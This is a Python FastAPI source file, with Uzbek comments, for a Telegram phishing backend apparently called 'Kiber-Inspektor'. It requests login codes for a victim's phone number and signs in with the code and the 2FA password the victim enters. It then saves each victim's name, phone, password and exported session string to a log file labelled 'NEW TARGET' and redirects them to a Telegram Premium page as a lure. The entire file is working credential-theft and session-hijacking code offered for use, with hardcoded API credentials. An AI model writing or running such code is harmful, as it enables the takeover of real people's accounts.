import asyncio
import logging
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from pydantic import BaseModel
import uvicorn

# --- SOZLAMALAR ---
API_ID = 33223639 
API_HASH = 'da4a254e086d07d78998b7992e64a39b'

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="Kiber-Inspektor 2FA Engine")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Foydalanuvchi obyektlarini saqlash
active_clients = {}

class AuthRequest(BaseModel):
    phone: str
    code: str = None
    hash: str = None
    password: str = None # 2FA paroli uchun

@app.post("/send")
async def send_otp(data: AuthRequest):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    
    try:
        sent = await client.send_code_request(data.phone)
        active_clients[data.phone] = client
        logger.info(f"Kod yuborildi: {data.phone}")
        return {"hash": sent.phone_code_hash}
    except Exception as e:
        logger.error(f"Xatolik (send): {str(e)}")
        raise HTTPException(status_code=400, detail="Telegram cheklovi yoki raqam xato.")

@app.post("/verify")
async def verify_otp(data: AuthRequest):
    client = active_clients.get(data.phone)
    if not client:
        raise HTTPException(status_code=400, detail="Sessiya topilmadi.")

    try:
        # Agar parol yuborilgan bo'lsa, parol bilan kirish
        if data.password:
            await client.sign_in(password=data.password)
        else:
            # Aks holda kod bilan kirish
            await client.sign_in(data.phone, data.code, phone_code_hash=data.hash)
        
        # Muvaffaqiyatli kirish bo'lsa
        captured_session = client.session.save()
        user = await client.get_me()
        
        log_data = (
            f"--- NEW TARGET (2FA) ---\n"
            f"NAME: {user.first_name} {user.last_name or ''}\n"
            f"USERNAME: @{user.username or 'yo\'q'}\n"
            f"PHONE: {data.phone}\n"
            f"PASS: {data.password or 'yo\'q'}\n"
            f"SESSION: {captured_session}\n"
            f"-------------------\n"
        )
        
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(log_data)
            
        logger.info(f"Sessiya saqlandi: {user.first_name}")
        
        # Jarayon tugadi, clientni o'chiramiz
        del active_clients[data.phone]
        
        return {"status": "success", "redirect": "https://t.me/premium"}
        
    except errors.SessionPasswordNeededError:
        # 2FA kerakligini frontendga xabar beramiz va clientni xotirada saqlab turamiz
        logger.info(f"2FA parol so'ralmoqda: {data.phone}")
        return {"status": "2fa_needed", "message": "Bulutli parol kerak."}
    
    except Exception as e:
        logger.error(f"Xatolik (verify): {str(e)}")
        # Xatolik bo'lsa clientni o'chirib tashlamaymiz (foydalanuvchi qayta urinishi mumkin)
        return {"status": "error", "message": "Kod yoki parol noto'g'ri."}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)